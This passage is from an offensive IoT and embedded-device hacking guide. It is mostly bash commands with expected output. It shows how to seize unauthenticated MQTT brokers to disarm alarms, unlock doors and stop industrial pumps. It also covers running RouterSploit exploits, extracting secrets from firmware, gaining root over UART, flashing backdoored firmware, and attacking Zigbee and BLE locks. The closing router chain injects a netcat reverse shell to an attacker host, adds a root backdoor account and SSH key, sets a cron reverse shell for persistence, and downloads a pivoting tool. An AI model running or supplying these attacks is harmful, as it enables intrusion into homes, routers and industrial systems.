sudo nmap -p 1883,8883 --open 192.168.1.0/24
# Port 1883 = MQTT (plain)
# Port 8883 = MQTT over TLS

# ── CONNECT AND ENUMERATE ─────────────────────────────────────────
# mosquitto_sub is the MQTT subscriber (built into mosquitto-clients):

# Subscribe to ALL topics (wildcard #):
mosquitto_sub -h 192.168.1.100 -t "#" -v
# -h = broker host
# -t "#" = subscribe to ALL topics (# = wildcard)
# -v = verbose (show topic + message)

# Expected output from smart home MQTT broker:
# home/livingroom/temperature 23.5
# home/bedroom/humidity 65
# home/frontdoor/lock closed
# home/alarm/status armed
# home/cameras/motion detected
# devices/sensor01/battery 87
# devices/lights/kitchen on

# ← You're receiving real-time data from all smart home devices!

# Subscribe to specific topic:
mosquitto_sub -h 192.168.1.100 -t "home/+/temperature" -v
# + = single-level wildcard

# ── PUBLISH COMMANDS (NO AUTH = FULL CONTROL) ─────────────────────
# If no authentication → publish commands to control devices!

# Turn off alarm:
mosquitto_pub -h 192.168.1.100 -t "home/alarm/set" -m "disarmed"

# Unlock front door:
mosquitto_pub -h 192.168.1.100 -t "home/frontdoor/lock/set" -m "open"

# Turn off all lights:
mosquitto_pub -h 192.168.1.100 -t "home/lights/all/set" -m "off"

# Industrial example — control a PLC via MQTT:
mosquitto_pub -h 192.168.1.100 -t "factory/pump1/command" -m "stop"
# This sends a "stop" command to an industrial pump!

# ── WITH CREDENTIALS ─────────────────────────────────────────────
mosquitto_sub -h 192.168.1.100 -u admin -P password -t "#" -v
mosquitto_pub -h 192.168.1.100 -u admin -P password -t "test" -m "hello"

# ── MQTT CREDENTIAL BRUTE FORCE ───────────────────────────────────
# Many MQTT brokers have weak credentials or no auth
# Test for anonymous access first:
mosquitto_sub -h 192.168.1.100 -t "test" -C 1
# If exits cleanly = anonymous access allowed

# ── CAPTURE MQTT CREDENTIALS (if sent over plaintext) ─────────────
# MQTT CONNECT packet contains credentials in cleartext
sudo tcpdump -i eth0 port 1883 -A | grep -E "User Name|Password"
# Expected on network sniff:
# User Name: admin
# Password: mqtt_password123

# ── MQTT RETAIN MESSAGES ──────────────────────────────────────────
# Retained messages are stored by broker and sent to new subscribers
# Subscribing to # will receive all retained messages (historical data!)
mosquitto_sub -h 192.168.1.100 -t "#" -v --retained-only
# Gets all stored messages — may include credentials, state data, tokens
```

---

## 12. RouterSploit — The Metasploit for Routers

```bash
# ── ROUTERSPLOIT SETUP ────────────────────────────────────────────
git clone https://github.com/threat9/routersploit
cd routersploit
pip3 install -r requirements.txt
python3 rsf.py
# Expected:
# ______            _            _____       _       _ _
# | ___ \          | |          /  ___|     | |     (_) |
# | |_/ /___  _   _| |_ ___ _ _\ `--.  _ __| | ___  _| |_
# |    // _ \| | | | __/ _ \ '__|`--. \| '__| |/ _ \| | __|
# | |\ \ (_) | |_| | ||  __/ |  /\__/ / |  | | (_) | | |_
# \_| \_\___/ \__,_|\__\___|_|  \____/|_|  |_|\___/|_|\__|

# ── AUTOPWN — AUTO-DETECT AND EXPLOIT ─────────────────────────────
rsf > use scanners/autopwn
rsf (AutoPwn) > set TARGET 192.168.1.1
rsf (AutoPwn) > set PORT 80
rsf (AutoPwn) > run
# Expected:
# [+] 192.168.1.1 Checking Linksys WRT54G v4 - CVE-2013-3568...
# [+] Target is vulnerable!
# [+] 192.168.1.1 Checking D-Link DIR-300 - authentication bypass...
# [*] Not vulnerable

# ── CREDENTIAL SCANNERS ────────────────────────────────────────────
rsf > use scanners/routers/router_scan
rsf (RouterScan) > set TARGET 192.168.1.1
rsf (RouterScan) > run
# Tests all known default credentials for the identified device

# ── SPECIFIC EXPLOITS ─────────────────────────────────────────────
# List all available exploits:
rsf > use exploits/routers/
# Tab completion shows all router exploits:
# asus/       cisco/      dlink/      huawei/
# linksys/    netgear/    tp_link/    zyxel/

# D-Link DIR-300 authentication bypass:
rsf > use exploits/routers/dlink/dir_300_600_rce
rsf (DIR-300/600 RCE) > set TARGET 192.168.1.1
rsf (DIR-300/600 RCE) > check
# Expected if vulnerable:
# [+] Target is vulnerable!
rsf (DIR-300/600 RCE) > run
# Expected:
# [*] Attempting to execute command...
# [+] Execution successful!
# $ id
# uid=0(root)

# Netgear WNR2000 — pass recovery information leak:
rsf > use exploits/routers/netgear/multi_rce
rsf (Netgear Multi RCE) > set TARGET 192.168.1.1
rsf (Netgear Multi RCE) > run

# TP-Link TL-WR740N — command injection:
rsf > use exploits/routers/tp_link/tplink_wdr_rce
rsf (TP-Link WDR RCE) > set TARGET 192.168.1.1
rsf (TP-Link WDR RCE) > run

# ── CREDS MODULE ──────────────────────────────────────────────────
rsf > use creds/routers/multi_telnet_default_creds
rsf > set TARGET 192.168.1.1
rsf > run
# Tries all known telnet default credentials for the device
```

---

# PART 3 — FIRMWARE ANALYSIS

---

## 13. What Firmware Is & How to Get It

### Layman's Terms
Firmware is the **operating system of an embedded device** — a flash chip containing the kernel, filesystem, web server, and all configuration. Getting firmware lets you analyze it offline: find hardcoded credentials, cryptographic keys, known vulnerable components, and backdoors **before ever touching a live device**.

```bash
# ── FIRMWARE ACQUISITION METHODS ──────────────────────────────────

# METHOD 1: Download from vendor website (easiest, safest)
# Every major vendor has a support page with firmware downloads:
# TP-Link: https://www.tp-link.com/us/support/download/
# Netgear: https://www.netgear.com/support/product/
# D-Link: https://support.dlink.com/
# Hikvision: https://www.hikvision.com/en/support/download/

# Just download the .bin, .zip, or .img file — binwalk handles the format

# METHOD 2: Capture from device update traffic
# Intercept firmware update to get binary over the wire:
sudo tcpdump -i eth0 -w update_capture.pcap host 192.168.1.1
# Trigger firmware update on device
# Extract firmware from pcap: Wireshark → Follow TCP Stream → Save as raw

# METHOD 3: Download directly from device (if shell access)
# Many routers expose firmware via TFTP or HTTP:
tftp 192.168.1.1
get firmware.bin

# Or via HTTP if device has a backup/download endpoint:
curl http://192.168.1.1/cgi-bin/export_settings.sh > firmware.bin

# METHOD 4: UART console bootloader
# At boot, interrupt bootloader (U-Boot), boot to shell, dump flash
# (Covered in Section 18 — UART)

# METHOD 5: SPI flash chip extraction
# Physical: desolder chip, read with Flashrom
# (Covered in Section 20-21)

# ── IDENTIFYING FIRMWARE TYPE ─────────────────────────────────────
file firmware.bin
# Expected outputs:
# data             ← raw binary (need binwalk)
# gzip compressed  ← extract first
# Zip archive      ← extract and find .bin inside
# UBI image        ← NAND flash image

strings firmware.bin | head -30
# Reveals: kernel strings, copyright notices, vendor info

binwalk firmware.bin | head -20
# Quick scan to see what's inside
```

---

## 14. Binwalk — Firmware Extraction & Analysis

### Layman's Terms
Binwalk is the **Swiss Army knife of firmware analysis**. Give it any binary file and it identifies embedded filesystems, compressed data, encrypted sections, kernel images, and more. Then it extracts them so you can analyze the actual filesystem.

```bash
# ── BASIC ANALYSIS ────────────────────────────────────────────────
binwalk firmware.bin
# Expected output:
# DECIMAL    HEXADECIMAL   DESCRIPTION
# ----------------------------------------------------------------
# 0          0x0           TRX firmware header, image size: 3735552
# 28         0x1C          LZMA compressed data
# 131096     0x20018       Squashfs filesystem, little endian
#                          version 4.0, compression: lzma
#                          size: 3604064, blocksize: 131072

# ── EXTRACT EVERYTHING ────────────────────────────────────────────
binwalk -e firmware.bin
# -e = extract
# Creates: _firmware.bin.extracted/ directory

ls _firmware.bin.extracted/
# Expected:
# 1C          ← LZMA compressed data
# 1C.7z       ← extracted
# squashfs-root/  ← ACTUAL FILESYSTEM!

ls _firmware.bin.extracted/squashfs-root/
# Expected: bin/ dev/ etc/ lib/ proc/ sbin/ sys/ usr/ var/
# This is the actual router's filesystem!

# ── RECURSIVE EXTRACTION (for nested archives) ─────────────────────
binwalk -Me firmware.bin
# -M = matryoshka (recursively extract)
# -e = extract
# Handles: compressed within compressed within encrypted

# ── ENTROPY ANALYSIS (find encrypted/compressed sections) ─────────
binwalk -E firmware.bin
# Generates entropy graph
# High entropy (near 8.0) = encrypted or compressed
# Low entropy = plaintext data, code

# ── SIGNATURE SCANNING ────────────────────────────────────────────
binwalk --list   # Show all supported signatures
# Finds: file systems (squashfs, jffs2, cramfs, ext2)
#        compression (gzip, lzma, zlib, bzip2)
#        bootloaders (U-Boot, GRUB)
#        kernels (Linux, eCos, VxWorks)
#        crypto (TLS certificates, RSA keys, SSL)

# ── FIND HARDCODED CREDENTIALS IN BINARY ──────────────────────────
binwalk --raw="\x00admin\x00password\x00" firmware.bin
# Find specific byte sequences

strings firmware.bin | grep -iE "password|passwd|secret|admin|root|user"
# Expected jackpots:
# admin:$1$salt$hashedpassword
# DEBUG_PASSWORD=letmein
# nvram_set("http_username", "admin")
# nvram_set("http_passwd", "1234")

# Find SSL/TLS private keys in firmware:
binwalk -A firmware.bin | grep -i "certificate\|private"
# Extract them:
openssl rsa -in extracted_key.pem -text -noout
```

---

## 15. Filesystem Analysis — Finding Secrets in Firmware

```bash
# ── AFTER BINWALK EXTRACTS FILESYSTEM ─────────────────────────────
cd _firmware.bin.extracted/squashfs-root/

# ── FIRMWALKER — AUTOMATED SECRET HUNTER ─────────────────────────
git clone https://github.com/craigz28/firmwalker
./firmwalker.sh /path/to/squashfs-root/ firmwalker_results.txt

# Firmwalker automatically finds:
# - Passwords and hashes
# - SSL/TLS private keys and certificates
# - SSH keys
# - Web server credentials
# - Hardcoded IP addresses
# - Database credentials
# - API keys and tokens

# ── MANUAL ANALYSIS ───────────────────────────────────────────────

# Find all password files:
find . -name "passwd" -o -name "shadow" -o -name "htpasswd" 2>/dev/null
cat etc/passwd
cat etc/shadow 2>/dev/null

# Find web server configuration (web admin credentials):
find . -name "*.conf" -exec grep -l "password\|admin\|user" {} \;
cat etc/httpd.conf 2>/dev/null
cat etc/lighttpd/lighttpd.conf 2>/dev/null

# Find startup scripts (reveals services, default configs):
cat etc/init.d/*
cat etc/rc.d/*
# Expected to find: default passwords set in startup scripts!

# Find SSL/TLS private keys:
find . -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null
# Check if private key is hardcoded (same on all units of same model!):
openssl rsa -in found_key.pem -check -noout
# If valid → extract and use for MITM attacks!

# Find hardcoded credentials in binary files:
grep -r "password" . --include="*.lua" --include="*.php" --include="*.cgi" 2>/dev/null
grep -r "admin" . --include="*.conf" 2>/dev/null
strings usr/sbin/httpd | grep -i "password\|admin\|secret"

# Find embedded backdoors:
grep -r "backdoor\|debug\|bypass" . 2>/dev/null
# Look for magic strings that unlock hidden functionality

# ── NVRAM CONFIGURATION (common in routers) ────────────────────────
# Many routers store config in NVRAM
# Often exported in firmware as defaults or in /etc/default/:
find . -name "nvram*" 2>/dev/null
cat etc/defaults/nvram.conf 2>/dev/null
# Expected to find: default admin password, WiFi key, management IPs

# ── FIND ENCRYPTION KEYS ─────────────────────────────────────────
# Look for AES keys, HMAC secrets:
find . -type f -exec binwalk -Y {} \; 2>/dev/null | grep -i "key\|AES\|HMAC"
# Or search for key material patterns:
grep -rn "key\s*=\s*[\"'][0-9a-fA-F]\{32,\}[\"']" . 2>/dev/null

# ── CHECK COMPONENT VERSIONS ──────────────────────────────────────
# Find all version strings to identify vulnerable components:
strings usr/sbin/telnetd | grep -i "version\|v[0-9]\."
strings usr/sbin/dropbear | grep -i "version"
strings lib/libssl.so | grep -i "openssl"
# Expected: OpenSSL 1.0.1 (vulnerable to Heartbleed!)

# ── SQUASHFS TOOLS FOR REPACKAGING ────────────────────────────────
# If you want to modify firmware and repack:
sudo apt install squashfs-tools
unsquashfs firmware.squashfs              # Extract
# Modify files in squashfs-root/
mksquashfs squashfs-root/ new_firmware.squashfs -comp lzma -b 131072
# Repacked! (Then update the parent container/TRX header)
```

---

## 16. Emulating Firmware with FirmAE & QEMU

```bash
# ── FIRMAE — AUTOMATED EMULATION ──────────────────────────────────
cd FirmAE

# Emulate Netgear router firmware:
sudo python3 run.py -r 192.168.0.1 netgear_firmware.bin NETGEAR
# -r = router IP
# Expected:
# [*] Extracting firmware...
# [*] Setting up QEMU environment...
# [*] Starting emulation...
# [+] Web interface available at http://192.168.0.1/

# Access the emulated router:
curl http://192.168.0.1/  # Test web interface
# Now you can test ALL network attacks locally
# No real hardware needed!

# ── MANUAL QEMU EMULATION (MIPS architecture) ─────────────────────
# Most consumer routers run MIPS (32-bit little or big endian)

# Install QEMU for MIPS:
sudo apt install qemu-system-mips qemu-user-static

# Run a single extracted binary:
# First find the correct QEMU binary for the architecture:
file squashfs-root/usr/sbin/httpd
# Expected: ELF 32-bit LSB executable, MIPS

# Run MIPS binary on x86 machine:
qemu-mipsel-static squashfs-root/usr/sbin/httpd
# -mipsel = MIPS little-endian
# qemu-mips = MIPS big-endian

# ── CHROOT INTO FIRMWARE (run firmware on Kali!) ──────────────────
# This is powerful — run the actual router's httpd on Kali!

# Copy QEMU static binary into firmware:
cp /usr/bin/qemu-mipsel-static squashfs-root/usr/bin/

# Chroot and run:
sudo chroot squashfs-root/ /usr/bin/qemu-mipsel-static /usr/sbin/httpd
# The router's web server is now running on Kali!
curl http://localhost/   # Test it!

# ── TESTING CGI VULNERABILITIES IN EMULATION ─────────────────────
# With firmware emulated → test command injection safely:
curl "http://localhost/cgi-bin/ping.cgi?ip=127.0.0.1;id"
# Expected: uid=0(root)
# Safe to test — it's just QEMU, not a real device!

# Test ALL CGI scripts for injection:
find squashfs-root/www/ -name "*.cgi" | while read cgi; do
  cgi_name=$(basename "$cgi")
  curl "http://localhost/cgi-bin/$cgi_name?test=;id" 2>/dev/null | grep -q "uid=" && \
    echo "VULNERABLE: $cgi_name"
done
```

---

## 17. Static Analysis of Embedded Binaries (Ghidra)

```bash
# ── GHIDRA — FREE NSA REVERSE ENGINEERING TOOL ────────────────────
# Download: https://ghidra-sre.org/
# Java-based, supports: MIPS, ARM, PowerPC, x86, x64, and more

# ── INSTALL ────────────────────────────────────────────────────────
# Download Ghidra 10.x from ghidra-sre.org
unzip ghidra_10.x.x_PUBLIC.zip
cd ghidra_10.x.x_PUBLIC
./ghidraRun

# ── ANALYZE ROUTER BINARY ─────────────────────────────────────────
# 1. File → New Project → Non-shared Project
# 2. File → Import File → select httpd (router web server)
# 3. Ghidra detects: MIPS 32-bit
# 4. Double-click to analyze → Auto Analysis → check all → Analyze
# 5. Wait 2-5 minutes for analysis

# ── FINDING VULNERABILITIES IN GHIDRA ─────────────────────────────
# After analysis:

# Search for dangerous functions (command injection):
# Window → Symbol Table → search: system
# OR: Search → Program Text → "system"
# Find all calls to system() → check if user input is passed unfiltered

# Search for string "password":
# Search → Program Text → "password"
# OR: Window → Defined Strings → search "admin"
# Expected: finds hardcoded credential strings!

# Decompile a function (MIPS assembly → C-like pseudocode):
# Click on function in Listing panel
# Window → Decompiler
# Readable C-like code appears!

# Example decompiled CGI handler (vulnerable):
# int ping_handler(char *input) {
#     char cmd[128];
#     sprintf(cmd, "ping -c 4 %s", input);  // Buffer overflow!
#     system(cmd);                            // Command injection!
#     return 0;
# }

# ── FINDING BACKDOORS ─────────────────────────────────────────────
# Search for suspicious strings:
# "factory", "backdoor", "debug", "test", "secret"
# Find authentication bypass functions:
# Look for functions that compare a string to a magic value

# Example backdoor (found in real firmware):
# if (strcmp(password, "c0nf1gur3") == 0) {
#     login_as_admin();  // Magic password always grants access!
# }
```

---

# PART 4 — HARDWARE INTERFACES

---

## 18. UART — Serial Console Access

### Layman's Terms
UART (Universal Asynchronous Receiver/Transmitter) is the **serial port of embedded devices**. Router manufacturers leave UART pins on the PCB for debugging during development — and they almost always forget to remove them in production. Connecting to UART gives you **direct access to the boot process, bootloader (U-Boot), and often a root shell** — all before any security software loads.

### Real-World Impact
UART is the most reliable way to get shell access on a device that resists all network-based attacks. Hikvision cameras, TP-Link routers, Netgear devices — virtually all have UART pads. With a $3 USB-to-TTL adapter, you bypass every software security control.

```bash
# ── EQUIPMENT NEEDED ──────────────────────────────────────────────
# USB-to-TTL adapter ($3-10): CP2102, CH340, FTDI232
# Jumper wires or test clips
# Multimeter (optional but helpful)
# Soldering iron (if pads need pins soldered)

# ── FINDING UART PINS ─────────────────────────────────────────────
# UART typically uses 4 pins: VCC (3.3V or 5V), GND, TX, RX
# Look for: 4-pin header or unpopulated pads near CPU
# Often labeled: TX, RX, GND, VCC (or 3V3)
# Sometimes labeled: J1, J2, CONSOLE, DEBUG, UART

# Visual identification:
# - Groups of 3-4 holes in a line
# - Near the edge of the board
# - Often near the main SoC/CPU

# Using multimeter to confirm:
# VCC: measures ~3.3V or 5V
# GND: measures 0V (continuity to ground)
# TX: Fluctuates during boot (0-3.3V transitions)
# RX: Steady 3.3V when idle

# ── CONNECTING USB-TO-TTL ADAPTER ─────────────────────────────────
# CRITICAL: Match voltage levels (most modern devices = 3.3V)
# 5V adapters will damage 3.3V devices!

# Connection:
# USB adapter GND  → Device GND     (always connect GND first)
# USB adapter RX   → Device TX      (cross-connect! RX←→TX)
# USB adapter TX   → Device RX      (cross-connect! TX←→RX)
# USB adapter VCC  → Device VCC     (optional if device powered)

# ── FINDING BAUD RATE ─────────────────────────────────────────────
# Common baud rates: 115200, 57600, 38400, 19200, 9600
# Try 115200 first (most common!)

# Connect with screen:
sudo screen /dev/ttyUSB0 115200
# If output looks like garbage: wrong baud rate, try next

# With minicom:
sudo minicom -s  # Configure serial settings
# Serial Device: /dev/ttyUSB0
# Baud rate: 115200, 8N1

# With picocom:
sudo picocom /dev/ttyUSB0 -b 115200

# ── WHAT TO EXPECT AT UART CONSOLE ───────────────────────────────
# Power on the device while connected to see boot output:
#
# U-Boot 2014.04 (Aug 05 2015 - 13:50:51)
# CPU: MIPS 24Kc V7.4
# DRAM: 64 MiB
# Flash: 8 MiB
# ...
# Starting kernel...
# ...
# Please press Enter to activate this console.   ← Press Enter!
# # id
# uid=0(root)          ← ROOT SHELL!

# ── U-BOOT INTERRUPT (BOOTLOADER ACCESS) ──────────────────────────
# During boot, U-Boot has a 1-3 second window to interrupt:
# Type: tpl (or just send any characters rapidly) during boot countdown

# U-Boot> help           ← See all commands
# U-Boot> printenv       ← Print all environment variables (credentials!)
# U-Boot> md 0x80000000  ← Memory dump (find sensitive data)
# U-Boot> tftpboot       ← Boot from TFTP (load custom firmware!)
# U-Boot> setenv bootargs "root=/dev/mtdblock2 init=/bin/sh"  
#                         ← Add init=/bin/sh for shell on boot!
# U-Boot> bootm         ← Boot with modified parameters → root shell!

# ── DUMP FIRMWARE VIA UART ────────────────────────────────────────
# Once you have a shell, dump the flash:
cat /dev/mtd0 | base64  # On device → copy output to Kali file
# Or via TFTP:
tftp -p -l /dev/mtd0 -r firmware.bin 10.10.10.50
```

---

## 19. JTAG & SWD — Debug Interface Exploitation

### Layman's Terms
JTAG is the **backdoor that chip manufacturers build in for testing**. It provides direct access to the CPU — you can halt the processor, read/write memory, dump flash, and debug running code. Every ARM processor has JTAG or its smaller cousin SWD. Finding and connecting to it gives you total hardware control.

```bash
# ── EQUIPMENT NEEDED ──────────────────────────────────────────────
# OpenOCD-compatible JTAG adapter:
# - Cheap: Bus Pirate ($30), Raspberry Pi (GPIO), Arduino
# - Good: J-Link EDU ($20-60), FT2232H-based adapters ($15-30)
# - Pro: Segger J-Link Professional

# ── IDENTIFYING JTAG PINS ─────────────────────────────────────────
# Standard JTAG signals: TDI, TDO, TCK, TMS, TRST (optional), GND
# ARM SWD (smaller: 2 pins): SWDIO, SWDCLK, GND

# Tools to find JTAG:
# JTAGulator ($200) — sends patterns to all IO pins, identifies JTAG
# UrJTAG (software) — probe with Bus Pirate

# ── OPENOCD — JTAG SOFTWARE ───────────────────────────────────────
sudo apt install openocd

# Configuration for common ARM target via FTDI:
cat > jtag.cfg << 'EOF'
interface ftdi
ftdi_device_desc "Dual RS232-HS"
ftdi_vid_pid 0x0403 0x6010

transport select jtag

set CHIPNAME stm32f1x
source [find target/stm32f1x.cfg]
EOF

openocd -f jtag.cfg
# Expected:
# Open On-Chip Debugger 0.12.0
# Info: clock speed 1000 kHz
# Info: JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477

# Connect GDB for debugging:
gdb-multiarch firmware.elf
# (gdb) target remote localhost:3333
# (gdb) monitor halt
# (gdb) info registers   ← CPU register state!
# (gdb) x/20wx 0x08000000  ← Memory dump
# (gdb) dump binary memory firmware.bin 0x08000000 0x08100000  ← Dump flash!

# ── READ FIRMWARE VIA JTAG ────────────────────────────────────────
# In OpenOCD console (telnet localhost 4444):
> halt
> flash list                   # List flash regions
> flash read_bank 0 firmware.bin 0 0xFFFFFF  # Dump entire flash!
> exit

# Extract and analyze firmware.bin with Binwalk as normal
```

---

## 20. SPI/I2C — Flash Chip Extraction

```bash
# ── SPI FLASH CHIPS ───────────────────────────────────────────────
# Most router/camera firmware stored in SPI NOR flash
# Common chips: W25Q64 (Winbond), MX25L series (Macronix), GD25Q (GigaDevice)
# Package: SOIC-8 (8-pin IC), sometimes WSON-8, TSOP

# ── READING WITHOUT DESOLDERING (clip method) ─────────────────────
# Use SOIC-8 test clip to make contact without soldering
# Equipment: SOIC-8 clip ($5-15) + SPI programmer

# ── FLASHROM WITH RASPBERRY PI (GPIO SPI) ─────────────────────────
# Raspberry Pi has built-in SPI interface — perfect free programmer!
# Enable SPI on RPi: raspi-config → Interfacing → SPI → Enable

# Install flashrom:
sudo apt install flashrom

# RPi GPIO connections to SOIC-8 clip:
# RPi Pin 19 (MOSI) → SPI chip MOSI/DI (pin 5)
# RPi Pin 21 (MISO) → SPI chip MISO/DO (pin 2)
# RPi Pin 23 (SCLK) → SPI chip CLK (pin 6)
# RPi Pin 24 (CE0)  → SPI chip CS/CE (pin 1)
# RPi Pin 25 (GND)  → SPI chip GND (pin 4)
# RPi Pin 17 (3.3V) → SPI chip VCC (pin 8)

# Read flash chip on RPi:
sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=512 -r firmware.bin
# Expected:
# flashrom v1.3.0 on Linux 5.15.0
# Found Winbond flash chip "W25Q64.V" (8192 kB, SPI) on linux_spi.
# Reading flash... done.

# ── WITH CH341A PROGRAMMER ────────────────────────────────────────
# CH341A: $5 USB SPI programmer — most common choice
sudo flashrom -p ch341a_spi -r firmware.bin
# Expected same result

# ── WRITE MODIFIED FIRMWARE BACK ─────────────────────────────────
# After modifying firmware (adding backdoor, removing auth check):
sudo flashrom -p ch341a_spi -w modified_firmware.bin
# Expected: "Writing... done."
# Remove chip clip, power on device — it now runs your firmware!
```

---

# PART 5 — WIRELESS PROTOCOLS

---

## 22. Zigbee Security & Attacks

```bash
# ── WHAT IS ZIGBEE ────────────────────────────────────────────────
# 802.15.4 based wireless protocol for smart home devices
# Range: 10-100m, Low power, Mesh network
# Used by: Philips Hue, IKEA Tradfri, SmartThings, Nest

# ── EQUIPMENT NEEDED ──────────────────────────────────────────────
# Texas Instruments CC2531 USB dongle ($10-15) — most common
# Ubertooth One ($120) — more capable
# nRF52840 Dongle ($10)

# ── TOOLS SETUP ───────────────────────────────────────────────────
# Install Wireshark plugin for Zigbee:
sudo apt install libpcap-dev python3-pyserial
pip3 install zigdiggity

# Flash CC2531 with sniffer firmware:
# Download: https://github.com/zigpy/zigpy-cc/releases
# Flash: cc-tool -e -w CC2531ZNP-Prod.hex

# ── CAPTURE ZIGBEE TRAFFIC ────────────────────────────────────────
# Zigbee uses channels 11-26 (2.4GHz) — need to know channel
# Many devices use channel 11, 15, 20, or 25

# Capture on channel 11:
sudo python3 -m scapy
# Or use Wireshark with CC2531:
wireshark -i /dev/ttyACM0

# ── ZIGBEE ATTACKS ────────────────────────────────────────────────
# zigdiggity — Zigbee security testing framework:
git clone https://github.com/BishopFox/zigdiggity
cd zigdiggity

# Scan for Zigbee networks:
python3 zigdiggity.py -i /dev/ttyACM0 scan

# Capture and decode network key (sent during device pairing!):
# 1. Put a device in pairing mode
# 2. Capture the key exchange
# 3. Key is sent in plaintext during pairing (Zigbee 1.2 vulnerability!)
python3 zigdiggity.py -i /dev/ttyACM0 sniff
# Expected: captures NWK key during pairing

# Once you have the network key — decrypt all Zigbee traffic
# Unlock/lock doors, control lights, read sensor data
```

---

## 23. Bluetooth Low Energy (BLE) Attacks

```bash
# ── BLE OVERVIEW ──────────────────────────────────────────────────
# BLE: Bluetooth 4.0+ used by IoT devices
# Used by: smart locks, fitness trackers, beacons, medical devices
# Range: 10-100m
# Security issues: lack of auth, cleartext data, replay attacks

# ── SETUP ─────────────────────────────────────────────────────────
sudo apt install bluetooth bluez
# Built-in Bluetooth adapter OR:
# Cheap BLE adapter: CSR8510 USB ($10)

# ── SCAN FOR BLE DEVICES ──────────────────────────────────────────
# Enable Bluetooth:
sudo hciconfig hci0 up

# Scan for advertising devices:
sudo hcitool lescan
# Expected:
# LE Scan ...
# AA:BB:CC:DD:EE:FF FrontDoor_Lock
# 11:22:33:44:55:66 (unknown)
# CC:DD:EE:FF:00:11 SmartBulb_Living

# More detailed scan with bluetoothctl:
bluetoothctl
# [bluetooth]# scan on
# [NEW] Device AA:BB:CC:DD:EE:FF Front Door Lock
# [bluetooth]# info AA:BB:CC:DD:EE:FF
# Shows: services, characteristics, UUIDs

# ── GATTTOOL — BLE ATTRIBUTE EXPLORATION ─────────────────────────
# Connect to BLE device:
gatttool -b AA:BB:CC:DD:EE:FF -I
# [AA:BB:CC:DD:EE:FF][LE]> connect
# Connection successful

# Discover all services and characteristics:
# [AA:BB:CC:DD:EE:FF][LE]> primary
# attr handle: 0x0001, end grp handle: 0x0005 uuid: Generic Access
# attr handle: 0x0006, end grp handle: 0x000f uuid: Generic Attribute
# attr handle: 0x0010, end grp handle: 0x001f uuid: 0000ffe0-... (custom!)

# Read a characteristic:
# [AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0015
# Characteristic value/descriptor: 4c 6f 63 6b 65 64  ← hex "Locked"!

# Write to characteristic (control device!):
# [AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0015 556e6c6f636b  
# hex: "Unlock" → send unlock command!

# ── BETTERCAP BLE (modern approach) ───────────────────────────────
sudo bettercap -eval "ble.recon on"
# Discovers all BLE devices with signal strength
# Shows manufacturer, service UUIDs, advertisement data

# ── BLE SNIFFING (capture all BLE traffic) ────────────────────────
# Ubertooth One:
ubertooth-btle -f -c capture.pcap
# Captures ALL BLE packets on all channels
# Open capture in Wireshark (BLE dissector built in)

# ── COMMON BLE VULNERABILITIES ────────────────────────────────────
# 1. No authentication on GATT characteristics
#    → Read/write any value without pairing
#
# 2. Cleartext data in advertisements
#    → Sensor readings, device state visible to anyone
#
# 3. Replay attacks
#    → Capture "unlock" command, replay it later
#
# 4. Insecure pairing (Just Works)
#    → Passive eavesdropper can calculate pairing key
#    → Decrypt all subsequent traffic
#
# 5. Default/hardcoded PIN
#    → 0000, 1234, 000000 always worth trying

# Test for Just Works pairing (no security):
bluetoothctl
# [bluetooth]# pair AA:BB:CC:DD:EE:FF
# If it pairs without PIN → Just Works (insecure!)
```

---

# PART 7 — SPECIFIC TARGET CLASSES

---

## 27. SOHO Router Exploitation — Full Chain

```bash
# ══════════════════════════════════════════════════════════════════
# FULL CHAIN: Discover → Identify → Exploit → Persist → Pivot
# Target: TP-Link TL-WR841N (common example, many real CVEs)
# ══════════════════════════════════════════════════════════════════

# ── PHASE 1: DISCOVERY ────────────────────────────────────────────
sudo nmap -sV -p 80,443,23,22,53 192.168.1.0/24 --open
# Expected: 192.168.1.1 has HTTP on :80, telnet on :23

# Fingerprint the device:
curl -s http://192.168.1.1/ | grep -i "tp-link\|model\|firmware"
# Expected: TP-Link TL-WR841N identified

# ── PHASE 2: DEFAULT CREDENTIALS ─────────────────────────────────
# Try admin:admin on TP-Link:
curl -u admin:admin http://192.168.1.1/
# Or test via browser: navigate to http://192.168.1.1, try admin:admin

# Check with RouterSploit:
python3 rsf.py
# rsf > use scanners/autopwn
# rsf > set TARGET 192.168.1.1
# rsf > run
# Expected: finds default credentials OR known exploit

# ── PHASE 3: VULNERABILITY EXPLOITATION ──────────────────────────
# TP-Link TL-WR841N — Command Injection in diagnostics:
# After logging in as admin, the ping diagnostic is injectable

# Get session cookie:
SESSION=$(curl -s -c - -u admin:admin http://192.168.1.1/ | grep COOKIE | awk '{print $7}')

# Inject command in ping target:
curl -b "admin_name=admin; admin_pass=admin" \
  "http://192.168.1.1/cgi-bin/luci/;stok=TOKEN/admin/diagnostic/ping" \
  --data "host=127.0.0.1;id"
# Expected: uid=0(root)

# Get reverse shell:
# First start listener: nc -lvnp 4444
curl -b "COOKIES" \
  "http://192.168.1.1/cgi-bin/luci/;stok=TOKEN/admin/diagnostic/ping" \
  --data "host=;busybox+nc+10.10.10.50+4444+-e+sh"
# Expected: root shell from router!

# ── PHASE 4: POST-EXPLOITATION ────────────────────────────────────
# You now have root shell on the router
id
# uid=0(root)
uname -a
# Linux TL-WR841N 3.3.8 MIPS GNU/Linux

# Extract all credentials:
cat /etc/passwd
nvram show | grep -i pass
cat /etc/config/wireless  # WiFi passwords!
# Expected:
# config wifi-iface
#   option ssid 'CompanyWifi'
#   option key 'WifiPassword123!'  ← WiFi password!

# Get all connected clients:
cat /proc/net/arp
# Shows all devices connected to this router with their IPs + MACs

# Capture router traffic (everything flowing through it):
tcpdump -i br-lan -w /tmp/capture.pcap &
# Captures ALL network traffic from all connected devices!

# ── PHASE 5: PERSISTENCE ──────────────────────────────────────────
# Add backdoor account:
echo "backdoor:x:0:0:root:/root:/bin/sh" >> /etc/passwd
# Or add SSH key for persistent access:
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker" >> /root/.ssh/authorized_keys

# Add to startup (cron):
echo "*/5 * * * * busybox nc 10.10.10.50 4444 -e sh" >> /etc/crontabs/root

# ── PHASE 6: USE AS PIVOT ─────────────────────────────────────────
# Router can reach all devices on the network
# Set up SOCKS proxy via Chisel:
wget http://10.10.10.50:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
